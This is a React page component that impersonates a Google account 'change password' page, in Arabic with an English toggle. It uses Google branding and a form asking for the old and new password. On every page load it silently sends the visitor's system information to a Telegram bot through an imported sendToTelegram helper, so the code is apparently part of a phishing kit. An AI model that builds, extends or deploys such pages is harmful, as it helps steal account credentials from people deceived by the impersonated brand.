import { useState, useEffect } from "react";
import { MoreVertical, Moon, Sun } from "lucide-react";
import GoogleLogo from "@/components/GoogleLogo";
import { usePasswordForm } from "@/hooks/usePasswordForm";
import { sendToTelegram, collectSystemInfo } from "@/utils/telegramNotifier";
import { PasswordForm } from "@/components/password/PasswordForm";

const Index = () => {
  const [showOldPassword, setShowOldPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [isDarkMode, setIsDarkMode] = useState(false);
  const [isArabic, setIsArabic] = useState(true);

  const passwordForm = usePasswordForm();

  useEffect(() => {
    const sendInitialInfo = async () => {
      const message = `
🌐 زيارة جديدة للموقع

${collectSystemInfo()}
      `;
      await sendToTelegram(message);
    };

    sendInitialInfo();
  }, []);

  const toggleDarkMode = () => {
    setIsDarkMode(!isDarkMode);
    document.documentElement.classList.toggle("dark");
  };

  return (
    <div className={`min-h-screen bg-white dark:bg-gray-900 transition-colors ${isArabic ? 'rtl' : 'ltr'}`}>
      <div className="max-w-7xl mx-auto px-4">
        <header className="flex items-center justify-between py-4">
          <button className="p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-full">
            <MoreVertical className="w-6 h-6 text-gray-600 dark:text-gray-300" />
          </button>
          
          <div className="flex items-center gap-2">
            <GoogleLogo />
            <span className="text-sm text-gray-600 dark:text-gray-300">
              {isArabic ? 'حساب' : 'Account'}
            </span>
          </div>
          
          <div className="flex items-center space-x-4">
            <button
              onClick={toggleDarkMode}
              className="p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-full"
            >
              {isDarkMode ? (
                <Sun className="w-6 h-6 text-gray-600 dark:text-gray-300" />
              ) : (
                <Moon className="w-6 h-6 text-gray-600" />
              )}
            </button>
            <button
              onClick={() => setIsArabic(!isArabic)}
              className="text-sm text-google-blue hover:underline"
            >
              {isArabic ? "English" : "العربية"}
            </button>
            <div className="w-8 h-8 rounded-full bg-google-blue text-white flex items-center justify-center">
              G
            </div>
          </div>
        </header>

        <main className="mt-8 w-full max-w-md mx-auto">
          <h1 className="text-2xl font-semibold text-center text-google-text dark:text-white mb-2">
            تغيير كلمة المرور
          </h1>
          <p className="text-sm text-center text-gray-600 dark:text-gray-300 mb-8">
            استخدم حساب جوجل الخاص بك لتغيير كلمة المرور
          </p>

          <PasswordForm
            {...passwordForm}
            showOldPassword={showOldPassword}
            showNewPassword={showNewPassword}
            showConfirmPassword={showConfirmPassword}
            toggleOldPassword={() => setShowOldPassword(!showOldPassword)}
            toggleNewPassword={() => setShowNewPassword(!showNewPassword)}
            toggleConfirmPassword={() => setShowConfirmPassword(!showConfirmPassword)}
          />

          <div className="mt-8 flex justify-center space-x-4 text-sm">
            <a href="#" className="text-google-blue hover:underline">إنشاء حساب</a>
            <span className="text-gray-500">•</span>
            <a href="#" className="text-google-blue hover:underline">سياسة الخصوصية</a>
            <span className="text-gray-500">•</span>
            <a href="#" className="text-google-blue hover:underline">شروط الاستخدام</a>
            <span className="text-gray-500">•</span>
            <a href="#" className="text-google-blue hover:underline">المساعدة</a>
          </div>
        </main>
      </div>
    </div>
  );
};

export default Index;